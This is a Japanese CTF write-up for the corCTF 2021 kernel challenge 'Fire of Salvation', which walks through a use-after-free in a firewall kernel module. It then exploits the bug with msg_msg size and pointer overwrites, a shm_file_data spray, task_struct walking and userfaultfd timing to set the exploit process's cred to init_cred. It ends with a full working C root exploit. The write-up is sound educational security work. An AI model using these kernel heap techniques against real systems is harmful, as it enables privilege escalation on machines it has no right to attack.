# keywords
kernel exploit / msg_msg / msg_seg / userfault_fd / cred walk / kmalloc-4k / shm_file_data / load_msg

# TL;DR

- FGKASLR / SMEP / SMAP / KPTI / static modprobe_path / slab randomized
- Impl a network module and a misc device to create user defined rule whether specific network packets should be accepted or dropped.
- The rule structure is placed on `kmalloc-4k` slab. There is a write-only partial UAF.
- Leak kernel data symbol by overwriting `msg_msg.m_ts` with `kmalloc-32` slab addr where `shm_file_data` are sprayed.
- Leak current process' `task_struct` by task walking.
- Overwrite `task_struct.cred` with `init_cred` by overwriting `msg_msg.next` in `load_msg()`. The timing is controlled by `userfaultfd`.

# イントロ

いつぞや開催された`CoR CTF 2021`のkernel pwn問題の`Fire of Salvation`を解いていく。
本問題は`#define`マクロの内容によってEASY/HARDの2種類の難易度として問題が出題されていたらしく、EASYは`Fire of Salvation`、HARDは`Wall of Perdition`という名前になっている。本エントリで解くのは、EASY難易度の方である。

# static

## lysithea

```lysithea.txt
Drothea v1.0.0
[.] kernel version:
        Linux version 5.8.0 (Francoise d'Aubigne@proud_gentoo_user) (gcc (Debian 10.2.0-15) 10.2.0, GNU ld (GNU Binutils for Debian) 2.35.1) #8 SMP Sun July 21 12:00:00 UTC 2021
[+] CONFIG_KALLSYMS_ALL is disabled.
cat: can't open '/proc/sys/kernel/unprivileged_bpf_disabled': No such file or directory
[!] unprivileged userfaultfd is enabled.
[?] KASLR seems enabled. Should turn off for debug purpose.
[?] kptr seems restricted. Should try 'echo 0 > /proc/sys/kernel/kptr_restrict' in init script.
Ingrid v1.0.0
[.] userfaultfd is not disabled.
[-] CONFIG_DEVMEM is disabled.
```

FGKASLR/SMEP/SMAP/KPTI/static modprobe_path/slab randomized。uffdは使える。あと珍しい?ことに`CONFIG_KALLSYMS_ALL`がdisableされている。
厳密には、ご丁寧にkernel configが全部開示されているため見る必要はない。しかも、not strippedなbzImageが配布されている。ちなみにソースコードはGitHubにはアップされていなかったが、author's writeupの最初の方を読んだ感じ本番では配布されていたようなので、ソースを見て解いた。同ブログによるとdebug symbolつきのvmlinuxを本番で配布したようだが、これはGitHubにもブログにも見つからなかったので、諦めて(?)debug symbol無しで解いた。

## module overview

ネットワークパケットをaccept/dropするルールをユーザが決められるようなモジュールと、ルールを編集するためのmiscデバイスが作られている。ルールは以下の構造体で定義され、これは`kmalloc-4k`スラブに入れられる。
```source.c
typedef struct
{
    char iface[16];            // interface name
    char name[16];             // rule name
    uint32_t ip;               // src/dst IP
    uint32_t netmask;          // src/dst IP netmask
    uint16_t proto;            // TCP / UDP
    uint16_t port;             // src/dst port
    uint8_t action;            // accept or drop
    uint8_t is_duplicated;     // flag which shows this rule is duplicated or not
    #ifdef EASY_MODE
    char desc[DESC_MAX];       // rule description
    #endif
} rule_t;
```

全てのメンバはユーザが指定でき、作成後に編集することも可能。しかし、`desc`だけはedit不可のため、実際に編集できるのは先頭0x30 bytesである。ルールはINBOUND/OUTBOUND毎に0x80ずつ作ることができる。


# vulnerability

INBOUNDのルールをOUTBOUNDにコピーする(or vice versa)機能がある:
```source.c
// partially snipped by me
static long firewall_dup_rule(user_rule_t user_rule, rule_t **firewall_rules, uint8_t idx)
{
    uint8_t i;
    rule_t **dup;

    dup = (user_rule.type == INBOUND) ? firewall_rules_out : firewall_rules_in;
    for (i = 0; i < MAX_RULES; i++)
    {
        if (dup[i] == NULL)
        {
            dup[i] = firewall_rules[idx];
            firewall_rules[idx]->is_duplicated = 1;
            return SUCCESS;
        }
    }
    return ERROR;
}
```
実装はINBOUNDのルールが入った`rule_t`構造体のアドレスを、OUTBOUNDルールの配列に代入しているだけである。一方で、ルールを削除する関数は以下のように実装されている:
```source.c
// partially snipped by me
static long firewall_delete_rule(user_rule_t user_rule, rule_t **firewall_rules, uint8_t idx)
{
    kfree(firewall_rules[idx]);
    firewall_rules[idx] = NULL;
    return SUCCESS;
}
```
INBOUND(or OUTBOUND)のルールのうち`idx`で指定されたものを`kfree()`し、該当する配列にNULLを入れている。
だが、先程見たようにここで`kfree`する`rule_t`構造体はduplicateされてOUTBOUND側にも入っている可能性がある。すなわち、freeされたオブジェクトにアクセスすることのできる**UAF**が存在する。
ルールを編集する機能は以下のように実装される:
```source.c
// partially snipped by me
static long firewall_edit_rule(user_rule_t user_rule, rule_t **firewall_rules, uint8_t idx)
{
    memcpy(firewall_rules[idx]->iface, user_rule.iface, 16);
    memcpy(firewall_rules[idx]->name, user_rule.name, 16);
    if (in4_pton(user_rule.ip, strnlen(user_rule.ip, 16), (u8 *)&(firewall_rules[idx]->ip), -1, NULL) == 0)
    {
        printk(KERN_ERR "[Firewall::Error] firewall_edit_rule() invalid IP format!\n");
        return ERROR;
    }
    
    if (in4_pton(user_rule.netmask, strnlen(user_rule.netmask, 16), (u8 *)&(firewall_rules[idx]->netmask), -1, NULL) == 0)
    {
        printk(KERN_ERR "[Firewall::Error] firewall_edit_rule() invalid Netmask format!\n");
        return ERROR;
    }

    firewall_rules[idx]->proto = user_rule.proto;
    firewall_rules[idx]->port = ntohs(user_rule.port);
    firewall_rules[idx]->action = user_rule.action;
    return SUCCESS;
}
```
つまり、UAFでは`description`を除く`rule_t`の先頭0x30 bytes分だけwriteができる。なお、read機能は実装されていない。

# FGKASLR

`nokaslr`にする前の状態で`kallsyms`を2回ほど見て気づいたが、FGKASLRが有効化されている。これによって、kernellandの各関数はそれぞれが独立したセクションに配置され、各セクションの配置はランダマイズされる。よって、.textシンボルのどれかをleakしたとしてもあまり効果がない。なお、FGKASLR問に関する過去のエントリは以下をチェック:
https://smallkirby.hatenablog.com/entry/2021/02/15/215158
https://smallkirby.hatenablog.com/entry/2021/02/16/225125

# kernel .data leak

## rough plan to leak data

FGKASLRが有効である以上、まずやるべきことは.dataシンボルのleakである。UAFのサイズが`kmalloc-4k`である、このサイズの有用な構造体というとだいぶ限られてくる。今回は`msg_msg`を使うことにした。`msg_msg`に関しては丁度、[前エントリ(nightclub from pbctf2021)](https://smallkirby.hatenablog.com/entry/2022/02/17/092547)でも使ったため、前提知識がない場合はそちらも参考のこと。`msg_msg`は以下のように定義される:
```/include/linux/msg.h
/* one msg_msg structure for each message */
struct msg_msg {
	struct list_head m_list;
	long m_type;
	size_t m_ts;		/* message text size */
	struct msg_msgseg *next;
	void *security;
	/* the actual message follows immediately */
};
```
`m_ts`はヘッダを除くメッセージの大きさを、`next`はメッセージサイズが`DATALEN_MSG`に収まらない場合の次のセグメントアドレスを表す。この`m_ts`を大きな値に書き換えることで、`msgrcv()`時に本来のメッセージサイズ以上に読み取ることができleakできると考えた。

## message unlinking from queue

試しにUAFした領域に`msg_msg`を確保し、`m_list`をNULL、`m_ts`を`DATALEN_MSG + 0x300`程度に書き換えたところ、以下のようなエラーになった:
![](https://i.imgur.com/MB94ggG.png)
NULL pointer derefが起きている。これは`do_msgrcv()`における以下の部分が問題である:
```/ipc/msg.c
// partially snipped by me
static long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg,
	       long (*msg_handler)(void __user *, struct msg_msg *, size_t))
{
	int mode;
	struct msg_queue *msq;
	struct ipc_namespace *ns;
	struct msg_msg *msg, *copy = NULL;
...
	if (msgflg & MSG_COPY) {
		if ((msgflg & MSG_EXCEPT) || !(msgflg & IPC_NOWAIT))
			return -EINVAL;
		copy = prepare_copy(buf, min_t(size_t, bufsz, ns->msg_ctlmax));
		if (IS_ERR(copy))
			return PTR_ERR(copy);
	}
	mode = convert_mode(&msgtyp, msgflg);
...
	msq = msq_obtain_object_check(ns, msqid);
...
	for (;;) {
		struct msg_receiver msr_d;
		msg = ERR_PTR(-EACCES);
...
		msg = find_msg(msq, &msgtyp, mode);
		if (!IS_ERR(msg)) {
			/*
			 * Found a suitable message.
			 * Unlink it from the queue.
			 */
			if ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {
				msg = ERR_PTR(-E2BIG);
				goto out_unlock0;
			}
			/*
			 * If we are copying, then do not unlink message and do
			 * not update queue parameters.
			 */
			if (msgflg & MSG_COPY) {
				msg = copy_msg(msg, copy);
				goto out_unlock0;
			}

			list_del(&msg->m_list);
...
			goto out_unlock0;
		}
...
out_unlock0:
	ipc_unlock_object(&msq->q_perm);
	wake_up_q(&wake_q);
out_unlock1:
	rcu_read_unlock();
	if (IS_ERR(msg)) {
		free_copy(copy);
		return PTR_ERR(msg);
	}

	bufsz = msg_handler(buf, msg, bufsz);
	free_msg(msg);

	return bufsz;
}
```
`msg_msg.m_list`は同一queue内に存在するメッセージを保持する双方向リストであるが、`list_del()`内でリストからメッセージを削除するために`msg_msg.m_list`がderefされる。今回は`m_list`をNULLでoverwriteしているためヌルポになってしまう。とはいっても、このUAFでは先頭からsequentialにwriteするしかないため、`msg_msg`の先頭にある`m_list`を書き換えずに残しておくことはできない。
対策としては、コード中にご丁寧に書いてあるように`COPY_MSG`をフラグとして指定してあげると、メッセージの取得時にメッセージはコピーされ、リストから外されない。これだけで`m_ts`を適当に書き換えてもヌルポは出なくなる。

## structure of `msg_msg` and `msg_seg`

`COPY_MSG`(と`IPC_NOWAIT`)を`msgrcv()`時のフラグとして指定してメッセージを読んだときの結果が以下のようになった:
![](https://i.imgur.com/UGzfXF4.png)
`0x55`は自分でメッセージとして入れた適当な値であり、それ以外は全く読まれていないことがわかる。これは`msg_msg`/`msg_seg`の仕組みを考えれば至ってふつうのコトである。
`msgsnd()`では以下のようにメッセージが作成される:
![](https://i.imgur.com/KdKZVQ9.png)
ユーザが指定したメッセージを、ヘッダを除いたサイズ(`DATALEN_MSG`/`DATALEN_SEG`)毎に分割し、それぞれをslabに置く。`msgrcv()`ではこれの逆で、`msg_msg`から`next`ポインタを辿って指定されたサイズ分だけメッセージを確保する。
先程の例では、`next`をNULLクリアしてしまっているため、`msg_msg`内のデータ(size: `DATALEN_MSG`)だけ読んだ時点でメッセージの読み込みが終了してしまう。例え大きな`m_ts`を指定したとしても、`next`がNULLの場合にはそれ以上メッセージは読み込まれない。

## randomized slab / leak via `shm_file_data`

というわけで、`msgsnd()`の際に`DATALEN_MSG`よりも大きいサイズのメッセージを与えたあと、***msg_msgの方をUAF領域に確保する***必要がある。この状態でUAFを使って`msg_msg.m_ts`を大きなサイズにすることで、`msg_seg`を読み込む際にOOB readが可能になる。
この段階で気づいたが、SLABのアドレスがランダマイズされていた(実際は、問題分にその旨が書かれていたが気づかなかった)。よって、victimとなる構造体をスプレーしたあとで`msg_seg`が確保されるようにし、`msg_seg`のすぐ後ろにvictim構造体が確保されることを祈るしか無い。よって、今回使う構造体の条件は「それなりに小さいサイズ」であること(sprayを容易にするため)と、「構造体内に.dataシンボルがあること」の2つとなる。[この辺](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628)を探すと、`shm_file_data`が使えそうであることがわかる。
なお、この際注意するべきこととして、もともと`msg_msg.next`に入っているアドレス(pointing to `msg_seg`)は上書きしてはいけない。幸いにも、今回のUAF writeは以下のように実装されている:
```source.c
// partially snipped by me
static long firewall_edit_rule(user_rule_t user_rule, rule_t **firewall_rules, uint8_t idx)
{
    memcpy(firewall_rules[idx]->iface, user_rule.iface, 16);
    memcpy(firewall_rules[idx]->name, user_rule.name, 16);
    /** ☆ CAN BE STOPED HERE ☆ **/
    if (in4_pton(user_rule.ip, strnlen(user_rule.ip, 16), (u8 *)&(firewall_rules[idx]->ip), -1, NULL) == 0)
    {
        printk(KERN_ERR "[Firewall::Error] firewall_edit_rule() invalid IP format!\n");
        return ERROR;
    }
    firewall_rules[idx]->proto = user_rule.proto;
    firewall_rules[idx]->port = ntohs(user_rule.port);
    firewall_rules[idx]->action = user_rule.action;
    return SUCCESS;
}
```
UAFをした際には、`name`と`m_ts`が、`ip`と`next`が対応しているのだが、`in4_pton()`がエラーを返すような文字列を敢えて渡すことで、`m_ts`までoverwriteした状態で処理を中止させることができる。これで、正規の`msg_seg`へのポインタ`next`は保たれたままになる。
そんな感じでUAFで`msg_msg.m_ts`を書き換えた後のheapは以下のようになる:
![](https://i.imgur.com/jHKasEa.jpg)

`msgrcv()`でleakされる値は以下のようになっており、.dataシンボルがleakできていることがわかる:
![](https://i.imgur.com/RZXonlb.png)

# overwrite cred

## `msgrcv()` internal with `MSG_COPY` flag

さて、ここまでで.dataがleakできているため、[以前(Krazynote from BalsnCTF2019)](https://smallkirby.hatenablog.com/entry/2020/08/09/085028)にも使ったように`task_struct.cred`を書き換えることでrootを取りたい。.dataがleakできているため、`init_task`/`init_cred`のアドレスも既にわかっている。あとはAAWが欲しい。
ここで今度は`msgrcv()`のフローを少しだけ詳細に見てみる:
![](https://i.imgur.com/MvXGbL5.png)
まず`load_msg()`において、`msgsnd()`で作られたものとは**また別の**`msg_msg/msg_seg`が確保される。そして、この`msg_msg`に対してユーザ指定のバッファ(`msgrcv()`で指定)から指定したサイズ分だけデータを取ってくる(このユーザランドから持ってくる処理、`MSG_COPY`に限って言えば全く意味のない処理だと思うんだけど、どうでしょう)。その後、`copy_msg()`において、`msgsnd()`で作られたオリジナルの`msg_msg`からデータを`memcpy()`でコピーしてくる。最後に、`do_msg_fill()`でユーザ指定のバッファに読んだデータを全部書き戻す。
ここで気になるのは図の③の部分でわざわざオリジナルの`msg_msg`からtemporaryな`msg_msg/msg_seg`へとコピーを行っている:
```/ipc/msgutil.c
struct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)
{
	struct msg_msgseg *dst_pseg, *src_pseg;
	size_t len = src->m_ts;
	size_t alen;

	if (src->m_ts > dst->m_ts)
		return ERR_PTR(-EINVAL);

	alen = min(len, DATALEN_MSG);
	memcpy(dst + 1, src + 1, alen);

	for (dst_pseg = dst->next, src_pseg = src->next;
	     src_pseg != NULL;
	     dst_pseg = dst_pseg->next, src_pseg = src_pseg->next) {

		len -= alen;
		alen = min(len, DATALEN_SEG);
		memcpy(dst_pseg + 1, src_pseg + 1, alen);
	}

	dst->m_type = src->m_type;
	dst->m_ts = src->m_ts;

	return dst;
}
```
コードからもわかるとおり、ここでも`msg_msg`を読んだ後に`next`が指す`msg_seg`からデータをコピーするフローになっている。

## AAW abusing `msgrcv` copy flow

さて、ここで**③の実行前に「temporaryな方」の`msg_msg.next`を任意のアドレスに書き換えることができれば、③のコピー時にオリジナルの`msg_msg`の中身を任意のアドレスに書き込むことができる**と考えられる。コピーに使うのは`memcpy()`であり、アドレスのレンジチェック等もない。
どうやって③の前に`msg_msg.next`を書き換えるかだが、①でtemporaryな`msg_msg`を確保した後、②でuserlandからのコピーが発生するため、②で`userfaultfd`を仕掛けることができる。つまり、予め「次に確保されるslabがUAF領域になる」ような状態を作っておいてから`msgrcv()`を呼ぶことでtemporaryな`msg_msg`はUAF-writableな状態になるため、②をuffdで止めている間にtemporaryな`msg_msg.next`を書き換えることができる。この時一緒に`m_ts`も適当に書き換えておくことで、AAWで書き込むサイズも任意に調整することができる。図にすると、以下の感じでAAWになる:
![](https://i.imgur.com/u1E0UQG.png)


## task_struct walk

これでAARもAAWも実現できたため、あとはやるだけゾーン。因みに、配布されたkernel configを見たところ`modprobe_path`はstaticになっていたため、`task_struct`の`cred`を書き換える方針で行く。まずAARを使って`init_task`の`tasks.prev`を辿っていき、epxloitプロセス自身の`task`を見つける。なお、`task_struct`内の`tasks`のoffsetを見つけるのが少しめんどくさい(`cred`自体は`init_task`の中身を`init_cred`の値でgrepすれば一瞬で分かる)。今回はまず、`prctl()`で`task_struct.comm`をマーキング(`0xffff888007526550`)し、その値でメモリ上を全探索して自プロセスの`task_struct`を見つけた後、そのアドレスを3nibbleくらいマスクした値(`0xffff888007526`)で`init_task`をgrepした。運が良いと`init_task.tasks.next`はexploitプロセスになっているから、これで`tasks`のoffsetが分かる(運が悪いとswapperとかがリストに入ってくる)。今回は`tasks`のオフセットが`0x298`であることがわかった:
![](https://i.imgur.com/UKqpmDo.png)

あとは`init_task`から`task_struct.tasks.prev`を辿って`comm`が設定した値になっている`task_struct`を探せば良い:
![](https://i.imgur.com/FSZmG0p.png)


# full exploit

```exploit.c
#include "./exploit.h"

/*********** commands ******************/

#define DEV_PATH "/dev/firewall"   // the path the device is placed
#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad
#define DESC_MAX 0x800

// size: kmalloc-4k
typedef struct
{
    char iface[16];
    char name[16];
    char ip[16];
    char netmask[16];
    uint8_t idx;
    uint8_t type;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
    char desc[DESC_MAX];
} user_rule_t;

// (END commands )

/*********** constants ******************/

#define ERROR -1
#define SUCCESS 0
#define MAX_RULES 0x80

#define INBOUND 0
#define OUTBOUND 1
#define SKIP -1

scu diff_init_cred_ipc_ns = 0xffffffff81c33060 - 0xffffffff81c3d7a0;
scu diff_init_task_ipc_ns = 0xffffffff81c124c0 - 0xffffffff81c3d7a0;

#define ADDR_FAULT 0xdead000

#define COMM_OFFSET 0x550
#define TASKS_PREV_OFFSET 0x2A0
#define TASKS_NEXT_OFFSET 0x298
#define CRED_OFFSET 0x540
#define TASK_OVERBUFSZ DATALEN_MSG + 0x800

// (END constants )

/*********** globals ******************/

int firewall_fd = -1;
char *buf_name;
char *buf_iface;
char *buf_ip;
char *buf_netmask;
ulong target_task = 0;

// (END globals )


long firewall_ioctl(long cmd, void *arg) {
  assert(firewall_fd != -1);
  return ioctl(firewall_fd, cmd, arg);
}

void add_rule(char *iface, char *name, uint8_t idx, uint8_t type, char *desc) {
  user_rule_t rule = {
    .idx = idx,
    .type = type,
    .proto = IPPROTO_TCP,
    .port = 0,
    .action = NF_DROP,
  };
  memcpy(rule.iface, iface, 16);
  memcpy(rule.name, name, 16);
  strcpy(rule.ip, "0.1.2.3");
  strcpy(rule.netmask, "0.0.0.0");
  memcpy(rule.desc, desc, DESC_MAX);
  long result = firewall_ioctl(ADD_RULE, (void*)&rule);
  assert(result == SUCCESS);
  return;
}

void dup_rule(uint8_t src_type, uint8_t idx) {
  user_rule_t rule = {
    .type = src_type,
    .idx = idx,
  };
  long result = firewall_ioctl(DUP_RULE, (void*)&rule);
  assert(result == SUCCESS);
  return;
}

void delete_rule(uint8_t type, uint8_t idx) {
  user_rule_t rule = {
    .type = type,
    .idx = idx,
  };
  long result = firewall_ioctl(DELETE_RULE, &rule);
  assert(result == SUCCESS);
  return;
}

long edit_rule(char *iface, char *name, uint8_t idx, uint8_t type, char *ip, char *netmask, ulong port) {
  user_rule_t rule = {
    .type = type,
    .idx = idx,
    .proto = IPPROTO_TCP,
    .port = port,
    .action = NF_ACCEPT,
  };
  memcpy(rule.iface, iface, 16);
  memcpy(rule.name, name, 16);
  if (ip == NULL ) strcpy(rule.ip, "0.0.0.0");
  else strcpy(rule.ip, ip);
  if (netmask == NULL) strcpy(rule.netmask, "0.0.0.0");
  else strcpy(rule.netmask, netmask);
  return firewall_ioctl(EDIT_RULE, &rule);
}

void edit_rule_preserve(char *iface, char *name, uint8_t idx, uint8_t type) {
  char *ip_buf = calloc(0x20, 1);
  strcpy(ip_buf, "NIRUGIRI\x00");
  assert(edit_rule(iface, name, idx, type, ip_buf, NULL, 0) == ERROR);
}

char *ntop(uint32_t v) {
  char *s = calloc(1, 0x30);
  unsigned char v0 = (v >> 24) & 0xFF;
  unsigned char v1 = (v >> 16) & 0xFF;
  unsigned char v2 = (v >> 8) & 0xFF;
  unsigned char v3 = v & 0xFF;
  sprintf(s, "%d.%d.%d.%d", v3, v2, v1, v0);
  return s;
}

void handle_fault(ulong arg) {
  const ulong target = target_task + CRED_OFFSET - 8 - 8;
  printf("[+] overwriting temp msg_msg.next with 0x%lx\n", target);
  memset(buf_iface, 0, 0x10); // m_list
  ((long*)buf_name)[0] = 1; // m_type
  ((long*)buf_name)[1] = DATALEN_MSG + 0x10 + 8; // m_ts
  strcpy(buf_ip, ntop(target)); // next & 0xFFFFFFFF
  strcpy(buf_netmask, ntop(target>> 32)); // next & (0xFFFFFFFF << 32)
  edit_rule(buf_iface, buf_name, 1, OUTBOUND, buf_ip, buf_netmask, 0);
}

struct msg4k {
  long mtype;
  char mtext[PAGE - 0x30];
};

int main(int argc, char *argv[]) {
  puts("[ ] Hello, world.");
  firewall_fd = open(DEV_PATH, O_RDWR);
  assert(firewall_fd >= 2);

  // alloc some buffers
  char *buf_1p = mmap(0, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  char *buf_cpysrc = mmap(0, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  char *buf_big = mmap(0, PAGE * 3, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  assert(buf_1p != MAP_FAILED && buf_big != MAP_FAILED);
  memset(buf_1p, 'A', PAGE);
  memset(buf_big, 0, PAGE * 3);
  buf_name = calloc(1, 0x30);
  buf_iface = calloc(1, 0x30);
  buf_ip = calloc(1, 0x30);
  buf_netmask = calloc(1, 0x30);

  // heap cleaning
  puts("[.] cleaning heap...");
  #define CLEAN_N 10
  for (int ix = 0; ix != CLEAN_N; ++ix) {
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    struct msg4k cleaning_msg = { .mtype = 1 };
    memset(cleaning_msg.mtext, 'B', PAGE - 0x30);
    KMALLOC(qid, cleaning_msg, 1);
  }

  // allocate sample rules
  puts("[.] allocating sample rules...");
  #define FIRST_N 30
  for (int ix = 0; ix != CLEAN_N; ++ix) {
    add_rule(buf_iface, buf_name, ix, INBOUND, buf_1p);
  }

  // dup rule 1
  puts("[.] dup rule 1...");
  dup_rule(INBOUND, 1);

  // delete INBOUND rule 1
  puts("[.] deleting inbound 1...");
  delete_rule(INBOUND, 1);

  // spray `shm_file_data` on kmalloc-32
  #define SFDN 0x50
  rep(ix, SFDN) {
    int shmid = shmget(IPC_PRIVATE, PAGE, 0600);
    assert(shmid >= 0);
    void *addr = shmat(shmid, NULL, 0);
    assert((long)addr >= 0);
  }

  // allocate msg_msg on 4k & 32 heap (UAF)
  puts("[.] allocating msg_msg for UAF...");
  int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  struct msg4k uaf_msg = { .mtype = 1 };
  memset(uaf_msg.mtext, 'U', PAGE - 0x30);
  assert(msgsnd(qid, &uaf_msg, DATALEN_MSG + 0x20 - 0x8, MSG_COPY | IPC_NOWAIT) == 0);

  // use UAF write to overwrite msg_msg.m_ts
  puts("[+] overwriting msg_msg by UAF.");
  #define OVERBUFSZ DATALEN_MSG + 0x300
  memset(buf_iface, 0, 0x10); // m_list
  ((long*)buf_name)[0] = 1; // m_type
  ((long*)buf_name)[1] = OVERBUFSZ; // m_ts
  edit_rule_preserve(buf_iface, buf_name, 0, OUTBOUND);

  errno = 0;
  // receive msg_msg to leak kern data.
  puts("[+] receiving msg...");
  assert(qid >= 0 && PAGE >= 0);
  memset(buf_big, 0, PAGE * 3);
  ulong tmp;
  if ((tmp = msgrcv(qid, buf_big, PAGE * 2, 0, MSG_COPY | IPC_NOWAIT | MSG_NOERROR)) <= 0) { // SEARCH_ANY
    errExit("msgrcv");
  }
  printf("[+] received 0x%lx size of msg.\n", tmp);
  //print_curious(buf_big + DATALEN_MSG, 0x300, 0);
  const ulong init_ipc_ns = *(ulong*)(buf_big + DATALEN_MSG + 0x5 * 8);
  const ulong init_cred = diff_init_cred_ipc_ns + init_ipc_ns;
  const ulong init_task = diff_init_task_ipc_ns + init_ipc_ns;
  if (init_ipc_ns == 0) { puts("[+] failed to leak init_ipc_ns."); exit(1);};
  printf("[!] init_ipc_ns: 0x%lx\n", init_ipc_ns);
  printf("[!] init_cred: 0x%lx\n", init_cred);
  printf("[!] init_task: 0x%lx\n", init_task);

  // task walk
  puts("[+] starting task_struct walking...");
  char *new_name = "NirugiriSummer";
  assert(strlen(new_name) < 0x10);
  assert(prctl(PR_SET_NAME, new_name) != -1);
  #define TASK_WALK_LIM 0x20
  ulong searching_task = init_task - 8;
  rep(ix, TASK_WALK_LIM) {
    if (target_task != 0) break;
    printf("[.] target addr: 0x%lx: ", searching_task);
    // overwrite `msg_msg.next`
    memset(buf_iface, 0, 0x10); // m_list
    ((long*)buf_name)[0] = 1; // m_type
    ((long*)buf_name)[1] = TASK_OVERBUFSZ; // m_ts
    strcpy(buf_ip, ntop(searching_task)); // next & 0xFFFFFFFF
    strcpy(buf_netmask, ntop(searching_task>> 32)); // next & (0xFFFFFFFF << 32)
    edit_rule(buf_iface, buf_name, 0, OUTBOUND, buf_ip, buf_netmask, 0);

    // leak `task_struct.comm`
    memset(buf_big, 0, PAGE * 2);
    if ((tmp = msgrcv(qid, buf_big, PAGE * 2, 0, MSG_COPY | IPC_NOWAIT | MSG_NOERROR)) <= 0) { // SEARCH_ANY
      errExit("msgrcv");
    }
    if (strncmp(buf_big + (DATALEN_MSG + 8) + COMM_OFFSET, new_name, 0x10)) {
      printf("Not exploit task (name: %s)\n", (buf_big + (DATALEN_MSG + 8) + COMM_OFFSET));
      //print_curious(buf_big + (DATALEN_MSG + 8), 0x500, 0);
      searching_task = *(ulong*)(buf_big + (DATALEN_MSG + 8) + TASKS_PREV_OFFSET) - TASKS_NEXT_OFFSET - 8;
    } else {
      puts(": FOUND!");
      target_task = searching_task + 8;
      break;
    }
  }
  if (target_task == 0) {
    puts("[-] failed to find target task...");
    return 1;
  }
  printf("[!] current task @ 0x%lx\n", target_task);

  /***********************************************/

  // heap cleaning
  puts("[.] cleaning heap...");
  for (int ix = 0; ix != CLEAN_N; ++ix) {
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    struct msg4k cleaning_msg = { .mtype = 1 };
    memset(cleaning_msg.mtext, 'E', PAGE - 0x30);
    KMALLOC(qid, cleaning_msg, 1);
  }

  // allocate sample rules
  puts("[.] allocating sample rules...");
  #define SECOND_N 10
  memset(buf_name, 'F', 0x10);
  memset(buf_iface, 'G', 0x10);
  for (int ix = 0; ix != CLEAN_N; ++ix) {
    add_rule(buf_iface, buf_name, FIRST_N + ix, INBOUND, buf_1p);
  }

  // dup rule 1
  puts("[.] dup rule S1...");
  dup_rule(INBOUND, FIRST_N + 1);

  // delete INBOUND rule 1
  puts("[.] deleting inbound S1...");
  delete_rule(INBOUND, FIRST_N + 1);

  // prepare uffd
  puts("[.] preparing uffd");
  struct skb_uffder *uffder = new_skb_uffder(ADDR_FAULT, 1, buf_cpysrc, handle_fault, "msg_msg_watcher", UFFDIO_REGISTER_MODE_MISSING);
  assert(uffder != NULL);
  memset(buf_cpysrc, 'G', DATALEN_MSG);
  ((ulong*)(buf_cpysrc + DATALEN_MSG))[0] = init_cred;
  ((ulong*)(buf_cpysrc + DATALEN_MSG))[1] = init_cred;
  puts("[.] waiting uffder starts...");
  usleep(500);
  skb_uffd_start(uffder, NULL);

  // allocate temp `msg_msg` on UAFed slab
  puts("[.] allocating temp msg_msg on UAFed slab.");
  if ((tmp = msgrcv(qid, ADDR_FAULT, PAGE, 0, MSG_COPY | IPC_NOWAIT | MSG_NOERROR)) <= 0) { // SEARCH_ANY
    errExit("msgrcv");
  }

  // end of life
  int uid = getuid();
  if (uid != 0) {
    printf("[-] Failed to get root...");
    exit(1);
  } else {
    puts("\n\n\n[+] HERE IS YOUR NIRUGIRI");
    NIRUGIRI();
  }
  puts("[ ] END of life...");
}
```


# アウトロ

![](https://i.imgur.com/Heua9wb.png)

成功率は`shm_file_data`のspray成功率が強く影響していて、まぁ70%くらいです、多分。すごく良い問題だったと思います。次はこれのHARDバージョンらしい、`Wall of Perdition`を解こうと思います。
あとHORIZONの新作買いました。やるのが楽しみです。


# References
Author
https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html
Author
https://syst3mfailure.io/wall-of-perdition 
CTF repository
https://github.com/Crusaders-of-Rust/corCTF-2021-public-challenge-archive/tree/main/pwn/fire-of-salvation
SLAB/SLUB abstraction
https://kernhack.hatenablog.com/entry/2017/12/01/004544
useful kernel structures
https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628
Krazynote writeup
https://smallkirby.hatenablog.com/entry/2020/08/09/085028
kernelpwn
https://github.com/smallkirby/kernelpwn

